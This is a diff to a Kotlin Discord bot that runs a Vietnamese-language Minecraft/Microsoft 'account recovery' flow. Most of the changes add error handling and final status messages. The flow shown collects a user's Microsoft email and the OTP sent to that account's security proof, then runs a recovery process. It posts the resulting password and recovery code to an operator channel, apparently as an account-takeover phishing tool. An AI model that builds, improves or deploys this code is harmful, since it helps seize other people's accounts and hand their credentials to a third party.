@@ -6,7 +6,9 @@ import dev.kord.common.entity.TextInputStyle
 import dev.kord.core.Kord
 import dev.kord.core.behavior.interaction.modal
 import dev.kord.core.behavior.interaction.respondEphemeral
+import dev.kord.core.behavior.interaction.response.edit
 import dev.kord.core.behavior.interaction.response.respond
+import dev.kord.core.entity.interaction.response.EphemeralMessageInteractionResponse
 import dev.kord.core.event.interaction.ButtonInteractionCreateEvent
 import dev.kord.core.event.interaction.ModalSubmitInteractionCreateEvent
 import dev.kord.core.on
@@ -39,31 +41,39 @@ class RecoveryInteractionEvent(
             val componentId = interaction.componentId
             when {
                 componentId == "start_recovery_btn" -> {
-                    interaction.modal("Khôi phục tài khoản", "recovery_step1_modal") {
-                        actionRow {
-                            textInput(TextInputStyle.Short, "ign_input", "IGN") {
-                                required = true
-                                placeholder = "Nhập tên in-game Minecraft"
+                    runCatching {
+                        interaction.modal("Khôi phục tài khoản", "recovery_step1_modal") {
+                            actionRow {
+                                textInput(TextInputStyle.Short, "ign_input", "IGN") {
+                                    required = true
+                                    placeholder = "Nhập tên in-game Minecraft"
+                                }
+                            }
+                            actionRow {
+                                textInput(TextInputStyle.Short, "email_input", "Email") {
+                                    required = true
+                                    placeholder = "Nhập email tài khoản Microsoft"
+                                }
                             }
                         }
-                        actionRow {
-                            textInput(TextInputStyle.Short, "email_input", "Email") {
-                                required = true
-                                placeholder = "Nhập email tài khoản Microsoft"
-                            }
-                        }
+                    }.onFailure { err ->
+                        logger.warn("Could not open recovery_step1_modal: {}", err.message)
                     }
                 }
 
                 componentId.startsWith("open_otp_modal:") -> {
                     val sessionId = componentId.substringAfter("open_otp_modal:")
-                    interaction.modal("Nhập mã OTP", "recovery_step2_modal:$sessionId") {
-                        actionRow {
-                            textInput(TextInputStyle.Short, "otp_input", "Mã OTP") {
-                                required = true
-                                placeholder = "Nhập mã OTP gồm 6 chữ số"
+                    runCatching {
+                        interaction.modal("Nhập mã OTP", "recovery_step2_modal:$sessionId") {
+                            actionRow {
+                                textInput(TextInputStyle.Short, "otp_input", "Mã OTP") {
+                                    required = true
+                                    placeholder = "Nhập mã OTP gồm 6 chữ số"
+                                }
                             }
                         }
+                    }.onFailure { err ->
+                        logger.warn("Could not open recovery_step2_modal: {}", err.message)
                     }
                 }
             }
@@ -80,6 +90,7 @@ class RecoveryInteractionEvent(
                     val sessionId = UUID.randomUUID().toString().take(8)
 
                     recoveryScope.launch {
+                        var initialResponse: EphemeralMessageInteractionResponse? = null
                         try {
                             val result = recoveryService.runLifecycle(
                                 email = email,
@@ -87,7 +98,7 @@ class RecoveryInteractionEvent(
                                     val otpDeferred = CompletableDeferred<String>()
                                     pendingOtpSessions[sessionId] = otpDeferred
                                     runCatching {
-                                        response.respond {
+                                        initialResponse = response.respond {
                                             content = "Mã OTP đã được gửi đến proof bảo mật của `$email`.\nNhấn nút bên dưới để nhập mã OTP:"
                                             actionRow {
                                                 interactionButton(ButtonStyle.Primary, "open_otp_modal:$sessionId") {
@@ -117,7 +128,7 @@ class RecoveryInteractionEvent(
                                 },
                             )
 
-                            when (result) {
+                            val finalMsg = when (result) {
                                 is RecoveryResult.Success -> {
                                     discordLogger.sendFinalResult(
                                         notiChannelId = properties.notiChannelId,
@@ -128,6 +139,7 @@ class RecoveryInteractionEvent(
                                         password = result.password,
                                         recoveryCode = result.finalRecoveryCode,
                                     )
+                                    "✅ Khôi phục tài khoản hoàn tất thành công!"
                                 }
 
                                 is RecoveryResult.Failure -> {
@@ -138,7 +150,24 @@ class RecoveryInteractionEvent(
                                         originalEmail = email,
                                         errorReason = "${result.stage}: ${result.message}",
                                     )
+                                    "❌ Khôi phục thất bại (${result.stage}): ${result.message}"
                                 }
+                            }
+
+                            runCatching {
+                                val current = initialResponse
+                                if (current != null) {
+                                    current.edit {
+                                        content = finalMsg
+                                        components = mutableListOf()
+                                    }
+                                } else {
+                                    response.respond {
+                                        content = finalMsg
+                                    }
+                                }
+                            }.onFailure { err ->
+                                logger.warn("Could not update interaction response: {}", err.message)
                             }
                         } catch (e: Exception) {
                             logger.error("Failed to run recovery lifecycle for {}: {}", email, e.message, e)
@@ -149,6 +178,21 @@ class RecoveryInteractionEvent(
                                 originalEmail = email,
                                 errorReason = e.message ?: "Unexpected error",
                             )
+                            runCatching {
+                                val current = initialResponse
+                                if (current != null) {
+                                    current.edit {
+                                        content = "❌ Có lỗi xảy ra: ${e.message}"
+                                        components = mutableListOf()
+                                    }
+                                } else {
+                                    response.respond {
+                                        content = "❌ Có lỗi xảy ra: ${e.message}"
+                                    }
+                                }
+                            }.onFailure { err ->
+                                logger.warn("Could not update interaction response after exception: {}", err.message)
+                            }
                         }
                     }
                 }
@@ -157,8 +201,12 @@ class RecoveryInteractionEvent(
                     val sessionId = modalId.substringAfter("recovery_step2_modal:")
                     val otp = interaction.textInputs["otp_input"]?.value?.trim().orEmpty()
 
-                    interaction.respondEphemeral {
-                        content = "Đã nhận mã OTP. Đang xử lý khôi phục và bảo mật tài khoản..."
+                    runCatching {
+                        interaction.respondEphemeral {
+                            content = "Đã nhận mã OTP. Đang xử lý khôi phục và bảo mật tài khoản..."
+                        }
+                    }.onFailure { err ->
+                        logger.warn("Could not respond to step 2 modal interaction: {}", err.message)
                     }
 
                     pendingOtpSessions[sessionId]?.complete(otp)
